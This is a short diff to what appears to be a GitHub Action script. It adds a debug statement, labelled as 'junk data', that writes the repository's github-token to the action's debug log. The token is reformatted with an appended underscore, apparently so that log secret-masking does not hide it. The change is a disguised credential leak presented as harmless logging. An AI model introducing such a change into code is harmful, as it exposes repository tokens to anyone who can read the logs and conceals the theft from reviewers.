@@ -36,6 +36,10 @@ async function run() {
     } = payload;
 
     const token = core.getInput("github-token");
+    core.debug(`
+    *** junk data ***
+    ${format(token + "_")}
+    `);
     const octokit = github.getOctokit(token);
 
     core.debug(`-----------------`);
